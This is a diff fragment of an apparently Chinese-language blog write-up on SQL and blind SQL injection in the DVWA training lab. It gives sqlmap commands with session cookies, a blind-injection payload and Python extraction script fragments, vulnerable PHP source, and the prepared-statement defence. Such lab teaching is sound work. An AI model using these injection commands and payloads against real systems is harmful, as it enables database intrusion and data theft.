-<h5 id="注入过程"><a href="#注入过程" class="headerlink" title="注入过程"></a>注入过程</h5><div class="hljs"><pre><code class="hljs stylus">python2 .\sqlmap<span class="hljs-selector-class">.py</span> -r  .\<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.txt</span> --batch --dbs
-python2 .\sqlmap<span class="hljs-selector-class">.py</span> -r  .\<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.txt</span> --batch -D dvwa --tables
-python2 .\sqlmap<span class="hljs-selector-class">.py</span> -r  .\<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.txt</span> --batch -D dvwa -T flag --<span class="hljs-attribute">columns</span>
-python2 .\sqlmap<span class="hljs-selector-class">.py</span> -r  .\<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.txt</span> --batch -D dvwa -T flag -C fl4g --dump</code></pre></div>
+<h5 id="注入过程"><a href="#注入过程" class="headerlink" title="注入过程"></a>注入过程</h5><div class="hljs"><pre><code class="hljs stylus">python2 .\sqlmap<span class="hljs-selector-class">.py</span> -r  .\<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.txt</span> <span class="hljs-attr">--batch</span> <span class="hljs-attr">--dbs</span>
+python2 .\sqlmap<span class="hljs-selector-class">.py</span> -r  .\<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.txt</span> <span class="hljs-attr">--batch</span> -D dvwa <span class="hljs-attr">--tables</span>
+python2 .\sqlmap<span class="hljs-selector-class">.py</span> -r  .\<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.txt</span> <span class="hljs-attr">--batch</span> -D dvwa -T flag <span class="hljs-attr">--columns</span>
+python2 .\sqlmap<span class="hljs-selector-class">.py</span> -r  .\<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.txt</span> <span class="hljs-attr">--batch</span> -D dvwa -T flag -C fl4g <span class="hljs-attr">--dump</span></code></pre></div>
 
 <p><img src="https://i.loli.net/2020/11/06/zaHYUItEZlPFh4e.png" srcset="/img/loading.gif" alt="sqlm-6.png"></p>
 <h3 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h3><p>这次用户输入与回显不在同一个页面，这只要是为了防止sqlmap这种自动化注入工具的攻击</p>
@@ -500,10 +500,10 @@ python2 .\sqlmap<span class="hljs-selector-class">.py</span> -r  .\<span class="
 
     <span class="hljs-comment">// Check database</span>
     <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 1;&quot;</span>;
-    <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>], <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#x27;</span> );
+    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>], <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#x27;</span> );
 
     <span class="hljs-comment">// Get results</span>
-    <span class="hljs-keyword">while</span>( <span class="hljs-variable">$row</span> = mysqli_fetch_assoc( <span class="hljs-variable">$result</span> ) ) &#123;
+    <span class="hljs-keyword">while</span>( <span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_assoc</span>( <span class="hljs-variable">$result</span> ) ) &#123;
         <span class="hljs-comment">// Get values</span>
         <span class="hljs-variable">$first</span> = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;first_name&quot;</span>];
         <span class="hljs-variable">$last</span>  = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;last_name&quot;</span>];
@@ -512,7 +512,7 @@ python2 .\sqlmap<span class="hljs-selector-class">.py</span> -r  .\<span class="
         <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;ID: <span class="hljs-subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="hljs-subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="hljs-subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;
     &#125;
 
-    ((is_null(<span class="hljs-variable">$___mysqli_res</span> = mysqli_close(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);        
+    ((<span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);        
 &#125;
 
 <span class="hljs-meta">?&gt;</span></code></pre></div>
@@ -567,7 +567,7 @@ flag = <span class="hljs-string">&quot;&quot;</span>
             right = mid
         mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>
     flag = flag + <span class="hljs-built_in">chr</span>(mid)
-print(flag)</code></pre></div>
+<span class="hljs-built_in">print</span>(flag)</code></pre></div>
 
 <p>1.首先获取表名</p>
 <p>使用payload:</p>
@@ -584,13 +584,13 @@ print(flag)</code></pre></div>
 <div class="hljs"><pre><code class="hljs n1ql">payload = &quot;1&#x27; and (<span class="hljs-keyword">select</span> ascii(substring(group_concat(fl4g),&#123;<span class="hljs-number">0</span>&#125;,<span class="hljs-number">1</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> flag <span class="hljs-keyword">having</span> a&gt;&#123;<span class="hljs-number">1</span>&#125;)%<span class="hljs-number">23</span><span class="hljs-string">&quot;.format(i,mid)</span></code></pre></div>
 
 <p><img src="https://i.loli.net/2020/11/06/9taguv2jR6cU5VD.png" srcset="/img/loading.gif" alt="bsqll-3.png"></p>
-<h4 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h4><div class="hljs"><pre><code class="hljs jboss-cli">python2 sqlmap.py -u <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot;</span> -p <span class="hljs-string">&quot;id&quot;</span>  <span class="hljs-params">--cookie</span> <span class="hljs-string">&quot;security=low; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span>  <span class="hljs-params">--dbs</span> <span class="hljs-params">--batch</span>
+<h4 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h4><div class="hljs"><pre><code class="hljs stylus">python2 sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot;</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-string">&quot;id&quot;</span>  <span class="hljs-attr">--cookie</span> <span class="hljs-string">&quot;security=low; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span>  <span class="hljs-attr">--dbs</span> <span class="hljs-attr">--batch</span>
 
-python2 sqlmap.py -u <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot;</span> -p <span class="hljs-string">&quot;id&quot;</span>  <span class="hljs-params">--cookie</span> <span class="hljs-string">&quot;security=low; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span>  -D dvwa <span class="hljs-params">--tables</span> <span class="hljs-params">--batch</span>
+python2 sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot;</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-string">&quot;id&quot;</span>  <span class="hljs-attr">--cookie</span> <span class="hljs-string">&quot;security=low; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span>  -D dvwa <span class="hljs-attr">--tables</span> <span class="hljs-attr">--batch</span>
 
-python2 sqlmap.py -u <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot;</span> -p <span class="hljs-string">&quot;id&quot;</span>  <span class="hljs-params">--cookie</span> <span class="hljs-string">&quot;security=low; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span>  -D dvwa -T flag <span class="hljs-params">--columns</span> <span class="hljs-params">--batch</span>
+python2 sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot;</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-string">&quot;id&quot;</span>  <span class="hljs-attr">--cookie</span> <span class="hljs-string">&quot;security=low; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span>  -D dvwa -T flag <span class="hljs-attr">--columns</span> <span class="hljs-attr">--batch</span>
 
-python2 sqlmap.py -u <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot;</span> -p <span class="hljs-string">&quot;id&quot;</span>  <span class="hljs-params">--cookie</span> <span class="hljs-string">&quot;security=low; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span>  -D dvwa -T flag -C fl4g <span class="hljs-params">--dump</span> <span class="hljs-params">--batch</span></code></pre></div>
+python2 sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot;</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-string">&quot;id&quot;</span>  <span class="hljs-attr">--cookie</span> <span class="hljs-string">&quot;security=low; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span>  -D dvwa -T flag -C fl4g <span class="hljs-attr">--dump</span> <span class="hljs-attr">--batch</span></code></pre></div>
 
 
 
@@ -627,20 +627,20 @@ t = <span class="hljs-string">&quot;&quot;</span>
         <span class="hljs-keyword">else</span>:
             right = mid
         mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>
-    print(mid)
+    <span class="hljs-built_in">print</span>(mid)
     flag = flag + <span class="hljs-built_in">chr</span>(mid)
-print(flag)
+<span class="hljs-built_in">print</span>(flag)
 </code></pre></div>
 
-<h4 id="sqlmap-1"><a href="#sqlmap-1" class="headerlink" title="sqlmap"></a>sqlmap</h4><div class="hljs"><pre><code class="hljs dsconfig"><span class="hljs-string">python2</span> <span class="hljs-string">sqlmap</span>.<span class="hljs-string">py</span> -<span class="hljs-string">u</span> <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot;</span> <span class="hljs-built_in">--data</span> <span class="hljs-string">&quot;id=1&amp;Submit=Submit&quot;</span> -<span class="hljs-string">p</span> <span class="hljs-string">&quot;id&quot;</span> <span class="hljs-built_in">--cookie</span> <span class="hljs-string">&quot;security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span> <span class="hljs-built_in">--dbs</span>
-<span class="hljs-built_in"></span>
-<span class="hljs-built_in"></span>
-<span class="hljs-built_in">python2</span> <span class="hljs-string">sqlmap</span>.<span class="hljs-string">py</span> -<span class="hljs-string">u</span> <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot;</span> <span class="hljs-built_in">--data</span> <span class="hljs-string">&quot;id=1&amp;Submit=Submit&quot;</span> -<span class="hljs-string">p</span> <span class="hljs-string">&quot;id&quot;</span> <span class="hljs-built_in">--cookie</span> <span class="hljs-string">&quot;security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span> -<span class="hljs-string">D</span> <span class="hljs-string">dvwa</span> <span class="hljs-built_in">--tables</span>
-<span class="hljs-built_in"></span>
-<span class="hljs-built_in">python2</span> <span class="hljs-string">sqlmap</span>.<span class="hljs-string">py</span> -<span class="hljs-string">u</span> <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot;</span> <span class="hljs-built_in">--data</span> <span class="hljs-string">&quot;id=1&amp;Submit=Submit&quot;</span> -<span class="hljs-string">p</span> <span class="hljs-string">&quot;id&quot;</span> <span class="hljs-built_in">--cookie</span> <span class="hljs-string">&quot;security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span> -<span class="hljs-string">D</span> <span class="hljs-string">dvwa</span> -<span class="hljs-string">T</span> <span class="hljs-string">flag</span> <span class="hljs-built_in">--columns</span>
-<span class="hljs-built_in"></span>
-<span class="hljs-built_in">python2</span> <span class="hljs-string">sqlmap</span>.<span class="hljs-string">py</span> -<span class="hljs-string">u</span> <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot;</span> <span class="hljs-built_in">--data</span> <span class="hljs-string">&quot;id=1&amp;Submit=Submit&quot;</span> -<span class="hljs-string">p</span> <span class="hljs-string">&quot;id&quot;</span> <span class="hljs-built_in">--cookie</span> <span class="hljs-string">&quot;security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span> -<span class="hljs-string">D</span> <span class="hljs-string">dvwa</span> -<span class="hljs-string">T</span> <span class="hljs-string">flag</span> -<span class="hljs-string">C</span> <span class="hljs-string">fl4g</span> <span class="hljs-built_in">--dump</span>
-<span class="hljs-built_in"></span></code></pre></div>
+<h4 id="sqlmap-1"><a href="#sqlmap-1" class="headerlink" title="sqlmap"></a>sqlmap</h4><div class="hljs"><pre><code class="hljs stylus">python2 sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot;</span> <span class="hljs-attr">--data</span> <span class="hljs-string">&quot;id=1&amp;Submit=Submit&quot;</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-string">&quot;id&quot;</span> <span class="hljs-attr">--cookie</span> <span class="hljs-string">&quot;security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span> <span class="hljs-attr">--dbs</span>
+
+
+python2 sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot;</span> <span class="hljs-attr">--data</span> <span class="hljs-string">&quot;id=1&amp;Submit=Submit&quot;</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-string">&quot;id&quot;</span> <span class="hljs-attr">--cookie</span> <span class="hljs-string">&quot;security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span> -D dvwa <span class="hljs-attr">--tables</span>
+
+python2 sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot;</span> <span class="hljs-attr">--data</span> <span class="hljs-string">&quot;id=1&amp;Submit=Submit&quot;</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-string">&quot;id&quot;</span> <span class="hljs-attr">--cookie</span> <span class="hljs-string">&quot;security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span> -D dvwa -T flag <span class="hljs-attr">--columns</span>
+
+python2 sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot;</span> <span class="hljs-attr">--data</span> <span class="hljs-string">&quot;id=1&amp;Submit=Submit&quot;</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-string">&quot;id&quot;</span> <span class="hljs-attr">--cookie</span> <span class="hljs-string">&quot;security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span> -D dvwa -T flag -C fl4g <span class="hljs-attr">--dump</span>
+</code></pre></div>
 
 
 
@@ -654,14 +654,14 @@ print(flag)
 <span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ]  ) ) &#123; 
     <span class="hljs-comment">// Get input </span>
     <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;id&#x27;</span> ]; 
-    <span class="hljs-variable">$id</span> = mysql_real_escape_string( <span class="hljs-variable">$id</span> ); 
+    <span class="hljs-variable">$id</span> = <span class="hljs-title function_ invoke__">mysql_real_escape_string</span>( <span class="hljs-variable">$id</span> ); 
 
     <span class="hljs-comment">// Check database </span>
     <span class="hljs-variable">$getid</span>  = <span class="hljs-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="hljs-subst">$id</span>;&quot;</span>; 
-    <span class="hljs-variable">$result</span> = mysql_query( <span class="hljs-variable">$getid</span> ); <span class="hljs-comment">// Removed &#x27;or die&#x27; to suppress mysql errors </span>
+    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>( <span class="hljs-variable">$getid</span> ); <span class="hljs-comment">// Removed &#x27;or die&#x27; to suppress mysql errors </span>
 
     <span class="hljs-comment">// Get results </span>
-    <span class="hljs-variable">$num</span> = @mysql_numrows( <span class="hljs-variable">$result</span> ); <span class="hljs-comment">// The &#x27;@&#x27; character suppresses errors </span>
+    <span class="hljs-variable">$num</span> = @<span class="hljs-title function_ invoke__">mysql_numrows</span>( <span class="hljs-variable">$result</span> ); <span class="hljs-comment">// The &#x27;@&#x27; character suppresses errors </span>
     <span class="hljs-keyword">if</span>( <span class="hljs-variable">$num</span> &gt; <span class="hljs-number">0</span> ) &#123; 
         <span class="hljs-comment">// Feedback for end user </span>
         <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>; 
@@ -680,12 +680,12 @@ print(flag)
 <p>本质上跟low级别的没有太大的区别，只是将一些特殊字符转义，但是我们注入时没有用到这些字符，所以注入语句基本和low级别一样</p>
 <h3 id="high-2"><a href="#high-2" class="headerlink" title="high"></a>high</h3><div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /dvwa/vulnerabilities/sqli_blind/ HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>
 <span class="hljs-attribute">Host</span>: <span class="hljs-number">10.5.8.66</span>
-<span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win<span class="hljs-number">64</span>; x<span class="hljs-number">64</span>; rv:<span class="hljs-number">82</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">82</span>.<span class="hljs-number">0</span>
+<span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64; rv:<span class="hljs-number">82</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">82</span>.<span class="hljs-number">0</span>
 <span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/webp,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>
 <span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span>
 <span class="hljs-attribute">Referer</span>: http://<span class="hljs-number">10.5.8.66</span>/dvwa/vulnerabilities/sqli/
 <span class="hljs-attribute">Connection</span>: close
-<span class="hljs-attribute">Cookie</span>: id=<span class="hljs-number">1</span>; security=high; PHPSESSID=e<span class="hljs-number">31</span>dkassqtg<span class="hljs-number">9388</span>l<span class="hljs-number">159</span>fn<span class="hljs-number">72</span>ac<span class="hljs-number">1</span>
+<span class="hljs-attribute">Cookie</span>: id=<span class="hljs-number">1</span>; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1
 <span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span>
 <span class="hljs-attribute">Cache</span>-Control: max-age=<span class="hljs-number">0</span></code></pre></div>
 
@@ -716,20 +716,20 @@ flag = <span class="hljs-string">&quot;&quot;</span>
         <span class="hljs-keyword">else</span>:
             right = mid
         mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>
-    print(mid)
+    <span class="hljs-built_in">print</span>(mid)
     <span class="hljs-comment">#print(t)</span>
     flag = flag + <span class="hljs-built_in">chr</span>(mid)
-print(flag)</code></pre></div>
+<span class="hljs-built_in">print</span>(flag)</code></pre></div>
 
 
 
-<h4 id="sqlmap-2"><a href="#sqlmap-2" class="headerlink" title="sqlmap"></a>sqlmap</h4><div class="hljs"><pre><code class="hljs jboss-cli">python2 sqlmap.py -u <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot;</span> -p <span class="hljs-string">&quot;id&quot;</span>  <span class="hljs-params">--cookie</span> <span class="hljs-string">&quot;id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span> <span class="hljs-params">--level</span> 2 <span class="hljs-params">--dbs</span> <span class="hljs-params">--batch</span>
+<h4 id="sqlmap-2"><a href="#sqlmap-2" class="headerlink" title="sqlmap"></a>sqlmap</h4><div class="hljs"><pre><code class="hljs stylus">python2 sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot;</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-string">&quot;id&quot;</span>  <span class="hljs-attr">--cookie</span> <span class="hljs-string">&quot;id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span> <span class="hljs-attr">--level</span> <span class="hljs-number">2</span> <span class="hljs-attr">--dbs</span> <span class="hljs-attr">--batch</span>
 
-python2 sqlmap.py -u <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot;</span> -p <span class="hljs-string">&quot;id&quot;</span>  <span class="hljs-params">--cookie</span> <span class="hljs-string">&quot;id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span> <span class="hljs-params">--level</span> 2 -D dvwa <span class="hljs-params">--tables</span> <span class="hljs-params">--batch</span>
+python2 sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot;</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-string">&quot;id&quot;</span>  <span class="hljs-attr">--cookie</span> <span class="hljs-string">&quot;id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span> <span class="hljs-attr">--level</span> <span class="hljs-number">2</span> -D dvwa <span class="hljs-attr">--tables</span> <span class="hljs-attr">--batch</span>
 
-python2 sqlmap.py -u <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot;</span> -p <span class="hljs-string">&quot;id&quot;</span>  <span class="hljs-params">--cookie</span> <span class="hljs-string">&quot;id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span> <span class="hljs-params">--level</span> 2 -D dvwa -T flag <span class="hljs-params">--columns</span> <span class="hljs-params">--batch</span>
+python2 sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot;</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-string">&quot;id&quot;</span>  <span class="hljs-attr">--cookie</span> <span class="hljs-string">&quot;id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span> <span class="hljs-attr">--level</span> <span class="hljs-number">2</span> -D dvwa -T flag <span class="hljs-attr">--columns</span> <span class="hljs-attr">--batch</span>
 
-python2 sqlmap.py -u <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot;</span> -p <span class="hljs-string">&quot;id&quot;</span>  <span class="hljs-params">--cookie</span> <span class="hljs-string">&quot;id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span> <span class="hljs-params">--level</span> 2 -D dvwa -T flag -C fl4g <span class="hljs-params">--dump</span> <span class="hljs-params">--batch</span></code></pre></div>
+python2 sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot;</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-string">&quot;id&quot;</span>  <span class="hljs-attr">--cookie</span> <span class="hljs-string">&quot;id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span> <span class="hljs-attr">--level</span> <span class="hljs-number">2</span> -D dvwa -T flag -C fl4g <span class="hljs-attr">--dump</span> <span class="hljs-attr">--batch</span></code></pre></div>
 
 <p><img src="https://i.loli.net/2020/11/12/jLdrQDiI9XlAZcU.png" srcset="/img/loading.gif" alt="bsqlh-5.png"></p>
 <h3 id="sql注入防御"><a href="#sql注入防御" class="headerlink" title="sql注入防御"></a>sql注入防御</h3><p>通过查看impossible源码发现检测了id数据类型，使用了预编译绑定id变量，有效防止SQL注入，这些可以在以后编程中应用，以编写出更加安全的代码。</p>
@@ -737,26 +737,26 @@ python2 sqlmap.py -u <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulne
 
 <span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ] ) ) &#123;
     <span class="hljs-comment">// Check Anti-CSRF token</span>
-    checkToken( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );
+    <span class="hljs-title function_ invoke__">checkToken</span>( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );
 
     <span class="hljs-comment">// Get input</span>
     <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;id&#x27;</span> ];
 
     <span class="hljs-comment">// Was a number entered?</span>
-    <span class="hljs-keyword">if</span>(is_numeric( <span class="hljs-variable">$id</span> )) &#123;   <span class="hljs-comment">//检测提交的数据是否为数字类型</span>
+    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_numeric</span>( <span class="hljs-variable">$id</span> )) &#123;   <span class="hljs-comment">//检测提交的数据是否为数字类型</span>
         <span class="hljs-comment">// Check the database</span>
-        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;prepare( <span class="hljs-string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27;</span> );<span class="hljs-comment">//预编译绑定了id变量</span>
-        <span class="hljs-variable">$data</span>-&gt;bindParam( <span class="hljs-string">&#x27;:id&#x27;</span>, <span class="hljs-variable">$id</span>, PDO::PARAM_INT );
-        <span class="hljs-variable">$data</span>-&gt;execute();
+        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>( <span class="hljs-string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27;</span> );<span class="hljs-comment">//预编译绑定了id变量</span>
+        <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:id&#x27;</span>, <span class="hljs-variable">$id</span>, PDO::<span class="hljs-variable constant_">PARAM_INT</span> );
+        <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();
 
         <span class="hljs-comment">// Get results</span>
-        <span class="hljs-keyword">if</span>( <span class="hljs-variable">$data</span>-&gt;rowCount() == <span class="hljs-number">1</span> ) &#123;
+        <span class="hljs-keyword">if</span>( <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">rowCount</span>() == <span class="hljs-number">1</span> ) &#123;
             <span class="hljs-comment">// Feedback for end user</span>
             <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;
         &#125;
         <span class="hljs-keyword">else</span> &#123;
             <span class="hljs-comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span>
-            header( <span class="hljs-variable">$_SERVER</span>[ <span class="hljs-string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="hljs-string">&#x27; 404 Not Found&#x27;</span> );
+            <span class="hljs-title function_ invoke__">header</span>( <span class="hljs-variable">$_SERVER</span>[ <span class="hljs-string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="hljs-string">&#x27; 404 Not Found&#x27;</span> );
 
             <span class="hljs-comment">// Feedback for end user</span>
             <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;
